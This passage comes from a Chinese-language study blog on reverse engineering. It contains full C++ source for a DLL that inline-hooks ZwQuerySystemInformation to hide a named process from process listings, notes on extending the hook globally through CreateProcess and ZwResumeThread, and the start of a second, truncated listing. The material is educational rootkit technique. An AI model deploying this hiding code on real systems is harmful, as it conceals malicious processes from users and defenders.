class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.SHARE&quot;</span>)</span></span><br><span class="line">    TCHAR g_szProcName[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// global variable</span></span><br><span class="line">BYTE g_pOrgBytes[<span class="number">5</span>] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	LPCTSTRszDIIName:[IN]包含要取的API的DLL文件名称。</span></span><br><span class="line"><span class="comment">	LPCTSTRszFuncName:[IN]要钩取的API名称。</span></span><br><span class="line"><span class="comment">	PROCpfnNew:[IN]用户提供的钩取函数地址。</span></span><br><span class="line"><span class="comment">	PBYTEpOrgBytes:[OUT]存储原来5个字节的缓冲区-后面“脱钩”时使用。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function">BOOL <span class="title">hook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FARPROC pfnOrg;</span><br><span class="line">    DWORD dwOldProtect, dwAddress;</span><br><span class="line">    BYTE pBuf[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>, <span class="number">0</span>, &#125;;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要钩取的API地址：ntdll.ZwQuerySystemInformation</span></span><br><span class="line">    pfnOrg = (FARPROC)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pfnOrg;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果已经被钩取，那么 return FALSE（E9是jmp的指令）</span></span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] == <span class="number">0xE9</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为了修改5个字节，先向内存添加&quot;写&quot;属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)pfnOrg, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 备份原有代码 (5 byte)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pOrgBytes, pfnOrg, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算JMP地址，(E9 XXXX)</span></span><br><span class="line">    <span class="comment">// =&gt; XXXX = pfnNew - pfnOrg - 5</span></span><br><span class="line">	<span class="comment">// Jmp相对地址=原来地址的下一条指令的地址-要跳转指令的地址</span></span><br><span class="line">    dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;pBuf[<span class="number">1</span>], &amp;dwAddress, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hook - 修改 5 byte (JMP XXXX)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pfnOrg, pBuf, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 回复内存属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)pfnOrg, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">unhook_by_code</span><span class="params">(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    PBYTE pByte;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得API地址：ntdll.ZwQuerySystemInformation</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(szDllName), szFuncName);</span><br><span class="line">    pByte = (PBYTE)pFunc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果已经脱钩，则 return FALSE</span></span><br><span class="line">    <span class="keyword">if</span>( pByte[<span class="number">0</span>] != <span class="number">0xE9</span> )</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为了修改5个字节，先向内存添加&quot;写&quot;属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Unhook</span></span><br><span class="line">    <span class="built_in">memcpy</span>(pFunc, pOrgBytes, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 回复内存属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)pFunc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	SystemInformationClass：系统信息的类别，指定需要获取哪些系统信息。它是一个枚举类型SYSTEM_INFORMATION_CLASS的值。</span></span><br><span class="line"><span class="comment">	SystemInformation：指向一个缓冲区的指针，用于存储获取到的系统信息。</span></span><br><span class="line"><span class="comment">	SystemInformationLength：缓冲区的大小，以字节为单位。该参数指定了SystemInformation指向的缓冲区的大小。</span></span><br><span class="line"><span class="comment">	ReturnLength：指向一个ULONG类型的指针，用于返回实际返回的系统信息的大小。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// jmp到的函数</span></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">NewZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">                SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">                PVOID SystemInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">                ULONG SystemInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">                PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status;</span><br><span class="line">    FARPROC pFunc;</span><br><span class="line">    PSYSTEM_PROCESS_INFORMATION pCur, pPrev;</span><br><span class="line">    <span class="type">char</span> szProcName[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 开始前先脱钩 unhook</span></span><br><span class="line">    <span class="built_in">unhook_by_code</span>(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 original API</span></span><br><span class="line">    pFunc = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(DEF_NTDLL), </span><br><span class="line">                           DEF_ZWQUERYSYSTEMINFORMATION);</span><br><span class="line">    status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)</span><br><span class="line">              (SystemInformationClass, SystemInformation, </span><br><span class="line">              SystemInformationLength, ReturnLength);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( status != STATUS_SUCCESS )</span><br><span class="line">        <span class="keyword">goto</span> __NTQUERYSYSTEMINFORMATION_END;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 仅针对 SystemProcessInformation</span></span><br><span class="line">    <span class="keyword">if</span>( SystemInformationClass == SystemProcessInformation )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// SYSTEM_PROCESS_INFORMATION 类型转换</span></span><br><span class="line">        <span class="comment">// pCur 是单链表的头</span></span><br><span class="line">        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(TRUE)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 比较进程名称</span></span><br><span class="line">            <span class="comment">// g_szProcName 为要隐藏的进程名称</span></span><br><span class="line">            <span class="comment">// (=&gt; 在SetProcName()中设置)</span></span><br><span class="line">            <span class="keyword">if</span>(pCur-&gt;Reserved2[<span class="number">1</span>] != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!_tcsicmp((PWSTR)pCur-&gt;Reserved2[<span class="number">1</span>], g_szProcName))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 从链表中删除要隐藏的进程</span></span><br><span class="line">                    <span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">                        pPrev-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                        pPrev-&gt;NextEntryOffset += pCur-&gt;NextEntryOffset;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>		</span><br><span class="line">                    pPrev = pCur;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(pCur-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 链表的下一项</span></span><br><span class="line">            pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur-&gt;NextEntryOffset);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">__NTQUERYSYSTEMINFORMATION_END:</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 再勾上 API</span></span><br><span class="line">    <span class="built_in">hook_by_code</span>(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, </span><br><span class="line">                 (PROC)NewZwQuerySystemInformation, g_pOrgBytes);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span>            szCurProc[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="type">char</span>            *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// #1. 异常处理</span></span><br><span class="line">    <span class="comment">// 若当前进程为 HookProc.exe ，则中止，不进行钩取操作</span></span><br><span class="line">    <span class="built_in">GetModuleFileNameA</span>(<span class="literal">NULL</span>, szCurProc, MAX_PATH);</span><br><span class="line">    p = <span class="built_in">strrchr</span>(szCurProc, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>( (p != <span class="literal">NULL</span>) &amp;&amp; !_stricmp(p+<span class="number">1</span>, <span class="string">&quot;HideProc.exe&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>( fdwReason )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// #2. API Hooking</span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH : </span><br><span class="line">			<span class="built_in">hook_by_code</span>(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, (PROC)NewZwQuerySystemInformation, g_pOrgBytes);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// #3. API Unhooking </span></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH :</span><br><span class="line">			<span class="built_in">unhook_by_code</span>(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">SetProcName</span><span class="params">(LPCTSTR szProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _tcscpy_s(g_szProcName, szProcName);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>&emsp;<strong>上述代码有几个坑：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 路径要写全，例如stealth.dll要写成绝对路径。如果不加绝对路径，那只能注入到当前目录下开的进程。</span><br><span class="line">2. Inject之后，Deject只能解除（show）一部分进程，不知道原因。</span><br><span class="line">3. 关于全局钩取的概念，有点混淆。是当前所有进程都被注入stealth.dll叫全局钩取？还是新开一个进程，此进程自动注入stealth.dll叫全局钩取？</span><br><span class="line">4. 注入之后，虽然ProcExp.exe注入了stealth.dll，但是还是能看到notepad.exe。感觉应该是ProcExp.exe版本较新的问题。</span><br></pre></td></tr></table></figure>
<p>&emsp;上面的JMP指令每次都要计算相对地址，我们也可以直接用绝对地址跳转，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(1) PUSH+RET</span><br><span class="line">	PUSH 00401000</span><br><span class="line">	RETN </span><br><span class="line">(2) MOV+JMP</span><br><span class="line">    MOV EAX, 00401000</span><br><span class="line">    JMP EAX</span><br></pre></td></tr></table></figure>
<h3 id="全局API钩取"><a href="#全局API钩取" class="headerlink" title="全局API钩取"></a>全局API钩取</h3><p>&emsp;针对的是：（1）当前所有进程；（2）未来所有进程。上述示例不满足条件（2）。</p>
<h4 id="Kernel32-CreateProcess-API"><a href="#Kernel32-CreateProcess-API" class="headerlink" title="Kernel32.CreateProcess API"></a>Kernel32.CreateProcess API</h4><p>&emsp;<code>Kernel32.CreateProcess</code> 用来创建新进程，其他启动运行进程的API（<code>WinExec</code>、<code>ShellExecute</code>、<code>system</code>）在内部也调用的<code>Kernel32.CreateProcess</code> 函数。<code>Kernel32.CreateProcess</code> API定义如下：</p>
<p><img src="/images/re-core-principle-3/image-20230415190834541.png" alt="image-20230415190834541" style="zoom:60%;" /></p>
<p>&emsp;因此，我们不仅要钩取<code>ZwQuerySystemlnformation</code>，还要钩取<code>CreateProcess</code>。<strong>由于所有进程都是由父进程（使用<code>CreateProcess</code>）创建的，所以，钩取父进程的<code>CreateProcess</code>就可以将<code>stealth.dll</code>文件注入所有子进程（父进程通常都是<code>explorer.exe</code>）。</strong>但是还要充分考虑以下几个方面：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 钩取CreateProcess时，还要分别钩取kernel32.CreateProcessA、kernel32.CreateProcessW这2个API（ASCI版本与Unicode版本）。</span><br><span class="line">2. CreateProcessA、CreateProcessW函数内部又分别调用了CreateProcessInternalA、CreateProcessInternalW函数。微软的部分软件产品中会直接调用CreateProcessInternalA/w这2个函数。所以具体实现全局API钩取时，为了准确起见，还要同时钩取上面2个函数（CreateProcessInternalA、CreateProcessInternalW）。</span><br><span class="line">3. 钩取函数(NewCreateProcess)还要调用原函数(CreateProcess)而创建的子进程的API。因此，极短时间内，子进程可能在未钩取的状态下运行。</span><br></pre></td></tr></table></figure>
<p>&emsp;但是，我们很懒，我们总想一步到位，有这样的好事吗？<strong>有，就是钩取<code>Ntdll.ZwResumeThread</code>。</strong>其定义如下所示：</p>
<p><img src="/images/re-core-principle-3/image-20230415200308638.png" alt="image-20230415200308638" style="zoom:67%;" /></p>
<p>&emsp;<code>ZwResumeThread</code>函数在进程创建后、主线程运行前被调用执行（<code>CreateProcess</code>内部调用执行）。所以只要钩取这个函数，即可在不运行子进程代码的状态下钩取API。<strong>注：<code>ZwResumeThread</code>是一个尚未公开的API，将来的某个时候可能会被改变。</strong></p>
<p>&emsp;练习具体在P346。<strong>注：要想全局钩取，就要把<code>stealth2.dll</code>放到<code>%SYSTEM%</code>（<code>C:\\Windows\\System32</code>）文件夹下。</strong></p>
<p>&emsp;<strong><code>HiddenProc2.cpp</code>与之前一样。</strong></p>
<p>&emsp;<strong><code>stealth2.cpp</code>代码如下所示：（钩取的<code>CreateProcessA</code>、<code>CreateProcessW</code>以及<code>ZwQuerySystemlnformation</code>。）</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stealth2.cpp -&gt; stealth2.dll</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;tchar.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_MODULE_NAME					(<span class="string">L&quot;stealth2.dll&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_HIDE_PROCESS_NAME			(<span class="string">L&quot;notepad.exe&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_SUCCESS					(0x00000000L) </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> LONG NTSTATUS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_SYSTEM_INFORMATION_CLASS</span> &#123;</span><br><span class="line">    SystemBasicInformation = <span class="number">0</span>,</span><br><span class="line">    SystemPerformanceInformation = <span class="number">2</span>,</span><br><span class="line">    SystemTimeOfDayInformation = <span class="number">3</span>,</span><br><span class="line">    SystemProcessInformation = <span class="number">5</span>,</span><br><span class="line">    SystemProcessorPerformanceInformation = <span class="number">8</span>,</span><br><span class="line">    SystemInterruptInformation = <span class="number">23</span>,</span><br><span class="line">    SystemExceptionInformation = <span class="number">33</span>,</span><br><span class="line">    SystemRegistryQuotaInformation = <span class="number">37</span>,</span><br><span class="line">    SystemLookasideInformation = <span class="number">45</span></span><br><span class="line">&#125; SYSTEM_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_PROCESS_INFORMATION</span> &#123;</span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    BYTE Reserved1[<span class="number">52</span>];</span><br><span class="line">    PVOID Reserved2[<span class="number">3</span>];</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    BYTE Reserved4[<span class="number">4</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">11</span>];</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved6[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *PFZWQUERYSYSTEMINFORMATION)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    SYSTEM_INFORMATION_CLASS SystemInformationClass, </span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID SystemInformation, </span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG SystemInformationLength, </span></span></span><br><span class="line"><span class="params"><span class="function">    PULONG ReturnLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFCREATEPROCESSA)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpApplicationName,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPTSTR lpCommandLine,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpProcessAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bInheritHandles,</span></span></span><br><span class="line"><span class="params"><span class="function">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPVOID lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCTSTR lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPSTARTUPINFO lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPPROCESS_INFORMATION 